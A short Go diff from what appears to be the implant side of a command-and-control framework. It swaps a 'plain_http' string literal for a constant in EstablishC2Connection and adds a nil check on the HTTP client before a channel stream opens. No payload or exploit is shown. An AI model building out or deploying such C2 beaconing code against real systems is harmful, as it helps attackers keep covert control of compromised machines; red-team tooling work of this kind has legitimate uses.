@@ -28,7 +28,7 @@ func EstablishC2Connection(url string, streamID string, capabilities ...string) 
 		cancel()
 		return nil, nil, nil, fmt.Errorf("unsupported c2 channel mode %q (available: %s)", mode, available)
 	}
-	if mode == "plain_http" {
+	if mode == def.C2ChannelModePlainHTTP {
 		if w, ok := channelWrapper.(*transport.HTTPChannelWrapper); ok {
 			w.Config = &common.RuntimeConfig.MalleableC2
 			w.PollInterval = common.RuntimeConfig.PollInterval
@@ -63,6 +63,10 @@ func EstablishC2Connection(url string, streamID string, capabilities ...string) 
 }
 
 func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
+	if def.HTTPClient == nil {
+		return nil, fmt.Errorf("http client is not initialized")
+	}
+
 	type connectResult struct {
 		stream io.ReadWriteCloser
 		resp   *http.Response
